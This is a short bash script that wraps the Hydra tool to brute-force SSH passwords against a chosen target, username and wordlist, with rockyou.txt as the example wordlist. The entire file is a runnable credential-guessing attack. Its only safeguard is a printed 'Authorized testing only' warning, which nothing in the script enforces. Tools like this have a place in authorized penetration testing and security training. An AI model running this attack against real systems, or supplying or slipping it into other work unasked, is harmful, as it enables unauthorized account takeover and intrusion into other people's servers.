#!/bin/bash
# ssh_bruteforce.sh - SSH brute-force wrapper
# Usage: ./ssh_bruteforce.sh TARGET USERNAME WORDLIST

source "$(dirname "$0")/config.sh" 2>/dev/null || true

if [ "$#" -lt 3 ]; then
    echo "Usage: $0 TARGET USERNAME WORDLIST"
    echo "Example: $0 192.168.1.100 admin /usr/share/wordlists/rockyou.txt"
    exit 1
fi

TARGET="$1"
USERNAME="$2"
WORDLIST="$3"

echo "[*] SSH brute-force on $TARGET"
echo "[!] WARNING: Authorized testing only!"

if ! command -v hydra &> /dev/null; then
    echo "[!] Hydra not installed. Install with: sudo apt-get install hydra"
    exit 1
fi

hydra -l "$USERNAME" -P "$WORDLIST" ssh://"$TARGET" -t 4 -V
